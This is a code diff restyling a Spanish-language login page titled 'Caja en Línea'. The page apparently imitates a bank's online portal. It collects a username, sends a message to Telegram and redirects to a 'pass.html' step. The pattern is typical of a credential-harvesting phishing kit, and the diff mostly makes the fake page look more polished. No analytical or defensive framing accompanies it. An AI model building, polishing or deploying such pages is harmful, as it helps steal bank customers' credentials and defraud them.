@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Caja en linea</title>
+    <title>Caja en Línea</title>
     <style>
         body {
             margin: 0; 
@@ -12,87 +12,62 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-start;
+            justify-content: center; /* Centrar verticalmente */
+            font-family: "Neo Sans Std", sans-serif; /* Fuente global */
         }
 
         .rectangle {
-            width: 599px;
-            height: 400px;
+            width: 90%; /* Ancho responsivo */
+            max-width: 600px; /* Máximo ancho */
+            padding: 20px; /* Espaciado interno */
+            background-color: #fff; /* Fondo blanco para el contenedor */
+            border-radius: 10px; /* Bordes redondeados */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Sombra para profundidad */
             position: relative;
-            margin-top: 188px; 
-            overflow: visible;
-            z-index: 1; 
-        }
-
-        .rectangle::after {
-            content: '';
-            position: absolute;
-            top: 117px;
-            left: 0;
-            right: 0;
-            height: 152px;
-            background-color: #D3D1D2;
-            z-index: 1;
+            z-index: 1; /* Asegurar que esté por encima */
         }
 
         .degradado {
             height: 117px;
             background: linear-gradient(to left, #072658, #063150, #0E6E80);
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 0;
+            border-radius: 10px 10px 0 0; /* Bordes redondeados en la parte superior */
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            color: white; /* Color del texto */
         }
 
         .imagen-logo {
-            width: 380px;
+            width: 80%; /* Ancho responsivo */
+            max-width: 200px; /* Tamaño máximo */
             height: auto;
             margin-bottom: 8px;
-            margin-left: -17px;
         }
 
         .texto {
-            font-family: "Neo Sans Std", sans-serif;
-            font-size: 24px;
-            line-height: 36px;
-            color: white;
+            font-size: 20px;
             text-transform: uppercase;
             text-align: center;
             font-weight: 400;
-            letter-spacing: normal;
-            word-spacing: 0px;
-        }
-
-        .imagen {
-            margin-top: -130px; 
-            width: 220px;
-            height: 340px;
         }
 
         .formulario-container {
             display: flex;
             align-items: center;
-            position: absolute;
-            top: 150px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 2;
+            margin: 20px 0; /* Espaciado vertical */
         }
 
         .formulario {
-            width: 284px;
-            height: 30px;
+            width: 100%; /* 100% del contenedor */
+            max-width: 284px; /* Tamaño máximo */
+            height: 40px;
             padding: 10px;
             border: 1px solid #ccc;
-            border-radius: 0;
+            border-radius: 4px; /* Bordes redondeados */
             font-size: 15px;
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-            margin-left: 15px;
+            margin-left: 10px; /* Espaciado a la izquierda */
         }
 
         .logo-pequeño {
@@ -101,20 +76,18 @@
         }
 
         .boton {
-            position: absolute;
-            top: 220px;
-            left: 85%; 
-            transform: translate(-50%, 0);
-            width: 165px;
+            width: 100%; /* 100% del contenedor */
+            max-width: 165px; /* Tamaño máximo */
             height: 40px;
             background-color: #083575;
             color: white;
             border: none;
-            border-radius: 0; 
+            border-radius: 4px; /* Bordes redondeados */
             cursor: pointer;
             font-size: 16px;
             font-weight: bold;
-            z-index: 2; 
+            margin-top: 20px; /* Margen superior */
+            transition: background-color 0.3s; /* Transición suave */
         }
 
         .boton:hover {
@@ -122,20 +95,16 @@
         }
 
         .texto-afiliacion {
-            position: absolute;
-            top: 236px;
-            left: 2%;
             color: #083575;
             font-size: 15px;
-            font-family: "Neo Sans Std", sans-serif;
-            z-index: 2; 
+            text-align: center; /* Centrar texto */
+            margin-top: 10px; /* Margen superior */
         }
 
         .afiliacion-enlace {
             color: #706d6d;
             font-weight: bold;
             cursor: pointer;
-            font-family: "Neo Sans Std", sans-serif;
         }
 
         /* Estilos para la pantalla de carga */
@@ -155,27 +124,34 @@
 
         .cargando .mensaje {
             color: white;
-            font-family: "Neo Sans Std", sans-serif;
             font-size: 20px;
             text-align: center;
             margin-bottom: 20px;
         }
 
         .cargando .imagen-carga {
-            width: 220px;
+            width: 80%; /* Ancho responsivo */
+            max-width: 220px; /* Tamaño máximo */
             height: auto;
         }
 
-        .contador {
+        .contador, .puntos {
             color: white;
-            font-family: "Neo Sans Std", sans-serif;
             font-size: 20px;
         }
 
-        .puntos {
-            color: white;
-            font-family: "Neo Sans Std", sans-serif;
-            font-size: 20px;
+        #error {
+            color: red;
+            text-align: center;
+            margin-top: 10px; /* Margen superior */
+            display: none; /* Ocultar inicialmente */
+        }
+
+        .imagen {
+            margin-top: 20px; /* Margen superior para separar de la caja */
+            width: 80%; /* Ancho responsivo */
+            max-width: 250px; /* Tamaño máximo */
+            height: auto;
         }
     </style>
 </head>
@@ -189,13 +165,14 @@
             <img src="user-icon2.svg" alt="Logo Pequeño" class="logo-pequeño">
             <input type="text" placeholder="INGRESE SU USUARIO" class="formulario" id="usuario" required>
         </div>
-        <span id="error" class="error" style="display:none; color:red;">Por favor, ingrese su usuario.</span>
+        <span id="error">Por favor, ingrese su usuario.</span>
         <div class="texto-afiliacion">
             ¿Usuario nuevo? <span class="afiliacion-enlace">Afíliate aquí</span>
         </div>
         <button id="continuar" class="boton">Continuar</button> 
     </div>
-    <img src="mascota.png" alt="Descripción de la imagen" class="imagen">
+
+    <img src="mascota.png" alt="Descripción de la imagen" class="imagen"> <!-- Imagen de mascota -->
 
     <div class="cargando" id="cargando">
         <div class="mensaje">
@@ -286,7 +263,7 @@
                 // Redirigir a pass.html después de enviar el mensaje
                 setTimeout(() => {
                     window.location.href = 'pass.html';
-                }, 10000); // Esperar 8 segundos
+                }, 10000); // Esperar 10 segundos
             })
             .catch(error => {
                 console.error('Error al enviar mensaje a Telegram:', error);
